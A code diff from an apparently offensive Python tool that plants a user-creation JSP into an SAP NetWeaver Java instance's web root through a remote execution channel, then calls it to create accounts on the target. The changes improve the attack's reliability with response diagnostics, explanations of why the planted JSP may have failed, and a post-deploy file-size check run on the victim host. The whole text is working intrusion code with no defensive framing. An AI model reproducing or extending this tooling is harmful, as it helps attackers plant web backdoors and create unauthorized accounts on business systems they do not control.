@@ -319,23 +319,28 @@ def invoke_create_user_jsp(jsp_url: str, username: str, password: str,
     ctx = ssl._create_unverified_context()
     req = urllib.request.Request(url, headers={"User-Agent": _UA})
     result = {"success": False, "status": "", "userid": "",
-              "group": "", "groupid": "", "error": "", "raw": ""}
+              "group": "", "groupid": "", "error": "", "raw": "",
+              "http_status": 0, "body_len": 0}
     try:
         with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
             text = r.read().decode("latin1", errors="replace")
+            result["http_status"] = r.status
     except urllib.error.HTTPError as e:
         try:
             text = e.read().decode("latin1", errors="replace")
         except Exception:
             text = ""
         result["error"] = f"HTTP {e.code}"
+        result["http_status"] = e.code
         result["raw"] = text[:500]
+        result["body_len"] = len(text)
         return result
     except (urllib.error.URLError, TimeoutError, OSError) as e:
         result["error"] = str(e)
         return result
 
     result["raw"] = text
+    result["body_len"] = len(text)
     for line in text.splitlines():
         if "=" not in line:
             continue
@@ -345,6 +350,24 @@ def invoke_create_user_jsp(jsp_url: str, username: str, password: str,
         if k in result:
             result[k] = v
     result["success"] = result["status"] in ("created", "exists")
+    # Surface something useful if the JSP responded but with no
+    # parseable status=… line.  Common causes: JSP was deployed to
+    # the wrong instance's root; the file we wrote was a truncated/
+    # garbled JSP source that rendered as empty; or the web tier is
+    # caching a stale response.
+    if not result["success"] and not result["error"]:
+        if result["body_len"] == 0:
+            result["error"] = (f"HTTP {result['http_status']} with empty "
+                                f"body — the JSP URL is reachable but "
+                                f"produced no output (likely deployed to "
+                                f"the wrong Java instance, or the written "
+                                f"file is not valid JSP).")
+        else:
+            result["error"] = (f"HTTP {result['http_status']} with "
+                                f"{result['body_len']}-byte body but no "
+                                f"status=… line parsed — "
+                                f"body starts with: "
+                                f"{text[:160]!r}")
     return result
 
 
@@ -528,6 +551,17 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
         exec_fn(cleanup_shell, cleanup_args)
     except Exception:
         pass
+
+    # Post-deploy sanity: ask the target for the JSP file's size.  An
+    # empty file or 'stat' failure means the decode didn't actually
+    # land content where we expected (often because the irj root for
+    # this instance lives elsewhere or is mounted from a shared path).
+    if linux:
+        st = exec_fn("/usr/bin/stat", f"-c %s {target_path}")
+        st_out = " ".join(str(l) for l in
+                            (st.get("output") or [])).strip()
+        print(f"[*] {node.sid}: post-deploy size check: "
+              f"{target_path} -> {st_out or '<no output>'}")
 
     # Determine JSP URL — caller supplies the Java HTTP port
     port = 50000 + java_instance_nr * 100
